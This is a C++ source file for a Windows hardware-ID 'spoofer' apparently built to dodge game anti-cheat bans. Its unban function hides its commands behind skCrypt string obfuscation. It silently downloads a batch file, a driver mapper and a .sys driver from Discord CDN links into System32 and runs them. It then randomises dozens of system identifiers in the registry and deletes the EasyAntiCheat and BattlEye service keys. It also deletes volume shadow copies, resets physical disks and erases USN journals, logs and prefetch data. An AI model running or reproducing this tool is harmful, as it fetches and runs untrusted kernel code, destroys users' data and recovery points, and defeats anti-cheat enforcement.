#include <Windows.h>
#include "skStr.h"


// While using this execution files can be easily dumped if you replace the driver then either change the execution method or don´t share the loader to many people

namespace spoofer {

	static void unban() {

			system(skCrypt("net stop winmgmt").decrypt()); // winmgmt can be a reason that the spoofing process fales, so we stop it in order to provent that case

			// Spoofing MAC Address (Perm)

			system(skCrypt("curl https://cdn.discordapp.com/attachments/1066782005947285534/1111017197658177626/mac.bat -o C:\\Windows\\System32\\mac.bat --silent").decrypt());
			system(skCrypt("C:\\Windows\\System32\\mac.bat --silent").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\mac.bat").decrypt());

			
			// Spoofing Diskdrive, BIOS, Baseboard (Temp)

			system(skCrypt("curl https://cdn.discordapp.com/attachments/1178079946099396709/1178336708610244608/mapper.exe -o C:\\Windows\\System32\\mapper.exe --silent").decrypt());
			system(skCrypt("curl https://cdn.discordapp.com/attachments/1178079946099396709/1178336734061269093/null.sys -o C:\\Windows\\System32\\null.sys --silent").decrypt());
			system(skCrypt("C:\\Windows\\System32\\mapper.exe C:\\Windows\\System32\\null.sys --silent").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\mapper.exe").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\null.sys").decrypt());

			// Spoofing Registry


			system(skCrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t reg_SZ /d %random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName /v ComputerName /t reg_SZ /d %random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareIds /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v HwProfileGuid /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\SQMClient /v WinSqmFirstSessionStartTime /t reg_QWORD /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t reg_QWORD /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t reg_QWORD /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Cryptography /v GUID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\HardwareConfig /v LastConfig /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v ClientUUID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v PersistenceIdentifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global\\CoProcManager /v ChipsetMatchID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"0\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"1\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1 /v Identifier /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\BasicDisplay\\Video /v VideoID /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Hostname /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\System\\CurrentControlSet\\Control\\DevQuery\\6 /v UUID /t reg_SZ /d%random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v NV\" \"Hostname /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\Software\\Microsoft /v BuildLab /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\Software\\Microsoft /v BuildLabEx /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v AccountDomainSid /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v PingID /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Tracing\\Microsoft\\Profile\\Profile /v Guid /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v registeredOwner /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v registeredOrganization /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildBranch /t reg_SZ /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId /t reg_BINARY /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId4 /t reg_BINARY /d %random%%random%-%random%%random%-%random%%random% /f").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\kbdclass\\Parameters /v WppRecorder_TraceGuid /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f").decrypt());
			system(skCrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\mouhid\\Parameters /v WppRecorder_TraceGuid /t reg_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SYSTEM\\MountedDevices /f").decrypt());
			system(skCrypt("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f").decrypt());
			system(skCrypt("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f").decrypt());
			system(skCrypt("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f").decrypt());
			system(skCrypt("reg DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v AcpiData /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v BiosData /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v registersData /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v SMBiosData /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f").decrypt());
			system(skCrypt("reg DELETE HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f").decrypt());
			system(skCrypt("net start winmgmt /y >nul").decrypt());
			system(skCrypt("ipconfig /flushdns >nul").decrypt());
			system(skCrypt("netsh int reset all >nul").decrypt());
			system(skCrypt("netsh int ipv4 reset >nul").decrypt());
			system(skCrypt("netsh int ipv6 reset >nul").decrypt());
			system(skCrypt("netsh winsock reset >nul").decrypt());
			system(skCrypt("powershell vssadmin delete shadows /all >nul").decrypt());
			system(skCrypt("powershell Reset-PhysicalDisk * >nul").decrypt());
			system(skCrypt("fsutil usn deletejournal /n C: >nul").decrypt());
			system(skCrypt("fsutil usn deletejournal /n D: >nul").decrypt());
			system(skCrypt("fsutil usn deletejournal /n E: >nul").decrypt());
			system(skCrypt("fsutil usn deletejournal /n F: >nul").decrypt());
			system(skCrypt("del /s /f /q C:\\Windows\\System32\\restore\\MachineGuid.txt >nul").decrypt());
			system(skCrypt("del /s /f /q C:\\System Volume Information\\IndexerVolumeGuid >nul").decrypt());
			system(skCrypt("del /s /f /q C:\\System Volume Information\\tracking.log >nul").decrypt());
			system(skCrypt("del /s /f /q C:\\Windows\\INF\\setupapi.dev.log >nul").decrypt());
			system(skCrypt("del /s /f /q C:\\Windows\\INF\\setupapi.setup.log >nul").decrypt());
			system(skCrypt("rmdir /s /q C:\\Windows\\temp >nul").decrypt());
			system(skCrypt("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Temp >nul").decrypt());
			system(skCrypt("rmdir /s /q C:\\Windows\\Prefetch >nul").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\Solution.exe >nul").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\Solution64.sys >nul").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\Disk1.exe >nul").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\Disk2.exe >nul").decrypt());
			system(skCrypt("del C:\\Windows\\System32\\Mac.bat >nul").decrypt());

			system(skCrypt("cls").decrypt());
		
	}
}
